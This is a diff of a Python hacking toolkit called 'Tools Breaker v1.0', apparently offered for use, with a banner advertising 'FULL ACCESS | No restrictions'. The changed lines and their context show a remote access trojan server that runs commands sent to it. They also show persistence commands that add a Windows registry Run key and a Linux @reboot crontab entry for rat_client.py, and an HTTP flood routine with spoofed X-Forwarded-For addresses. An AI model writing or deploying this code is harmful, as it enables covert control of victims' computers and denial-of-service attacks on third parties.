@@ -76,7 +76,7 @@ def login():
     os.system('clear')
     print(colored("""
 ╔═════════════════════════════════════════╗
-║            Tools Breaker v1.0             ║
+║            Tools Breaker v1.0           ║
 ╚═════════════════════════════════════════╝
 """, 'red', attrs=['bold']))
 
@@ -147,12 +147,12 @@ PURPLE = '\033[38;5;55m'
 def print_banner(uid, plan):
     print(colored(f"""
 {PURPLE}{Style.BRIGHT}
-       ╔════════════════════════════════════╗
-       ║         Tools Breaker v1.0        
-       ╚════════════════════════════════════╝
+╔═════════════════════════════════════════════════════╗
+║               Tools Breaker v1.0                   ║
+╚═════════════════════════════════════════════════════╝
 {Style.RESET_ALL}User: {uid} | Mode: {plan}
 Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
-Mode: FULL ACCESS 
+Mode: FULL ACCESS | No restrictions
 """, None))
 
 # ================== SAVE LOCAL ONLY ==================
@@ -360,7 +360,7 @@ PORT = {port}
 BUFFER_SIZE = 4096
 
 print(f"[+] RAT Server Started")
-print(f"[+] Listening on {HOST}:{PORT}")
+print(f"[+] Listening on {{HOST}}:{{PORT}}")
 print(f"[+] Use CTRL+C to stop")
 
 class RATServer:
@@ -369,11 +369,11 @@ class RATServer:
         self.running = True
         
     def handle_client(self, client_socket, addr):
-        print(f"[+] Connection from {addr}")
+        print(f"[+] Connection from {{addr}}")
         
         try:
             # Send welcome message
-            client_socket.send(b"RAT_Connected\n")
+            client_socket.send(b"RAT_Connected\\n")
             
             while self.running:
                 # Receive command
@@ -382,7 +382,7 @@ class RATServer:
                 if not cmd:
                     break
                     
-                print(f"[{addr}] Command: {cmd}")
+                print(f"[{{addr}}] Command: {{cmd}}")
                 
                 if cmd.lower() == 'exit':
                     break
@@ -448,14 +448,10 @@ Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
                 elif cmd == 'persistence':
                     # Install persistence based on OS
                     if platform.system() == 'Windows':
-                        pers_cmd = '''
-reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v CYBER_RAT /t REG_SZ /d "pythonw.exe C:\\Windows\\Temp\\rat_client.py"
-'''
+                        pers_cmd = 'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v CYBER_RAT /t REG_SZ /d "pythonw.exe C:\\\\Windows\\\\Temp\\\\rat_client.py"'
                         client_socket.send(b"Persistence installed for Windows")
                     elif platform.system() == 'Linux':
-                        pers_cmd = '''
-echo "@reboot python3 /tmp/rat_client.py" | crontab -
-'''
+                        pers_cmd = 'echo "@reboot python3 /tmp/rat_client.py" | crontab -'
                         client_socket.send(b"Persistence installed for Linux")
                     else:
                         client_socket.send(b"Persistence not supported on this OS")
@@ -924,7 +920,7 @@ def attack():
             fake_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))
             
             # HTTP flood
-            headers = f"""GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\nUser-Agent: {{random.choice(user_agents)}}\\r\\nX-Forwarded-For: {{fake_ip}}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"""
+            headers = f"GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\nUser-Agent: {{random.choice(user_agents)}}\\r\\nX-Forwarded-For: {{fake_ip}}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"
             
             s.send(headers.encode())
             
